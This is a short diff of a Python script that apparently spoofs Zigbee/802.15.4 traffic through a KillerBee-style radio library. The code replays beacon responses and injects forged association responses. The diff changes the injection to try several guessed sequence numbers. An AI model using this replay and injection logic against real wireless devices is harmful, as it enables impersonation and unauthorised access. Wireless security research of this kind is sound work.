@@ -139,7 +139,7 @@ if __name__ == '__main__':
                 # Beacon requests have 0b011 at the end of their first byte
                 # and 0x07 as their 7th byte
                 if (packet_bytes[0] & 0b111 == 0b011 and packet_bytes[7] == 0x07):
-                    print('- Got beacon request. Replaying response.')
+                    print('  - Got beacon request. Replaying response.')
                     kb.sniffer_off()
                     sniffer_on = False
                     # Update timestamp
@@ -175,7 +175,8 @@ if __name__ == '__main__':
         # Remove FCS
         assoc_request_pkt_bytes = assoc_request_pkt_bytes[:-2]
         # Estimate sequence number
-        kb.inject(assoc_response_pkt_bytes[0:2] + bytearray([link_status_sn+1]) + assoc_response_pkt_bytes[3:])
+        for i in range(-1,5):
+            kb.inject(assoc_response_pkt_bytes[0:2] + bytearray([link_status_sn+i]) + assoc_response_pkt_bytes[3:])
 
         # ACK data requests and note when data was received
         print('10. Maintaining connection...')
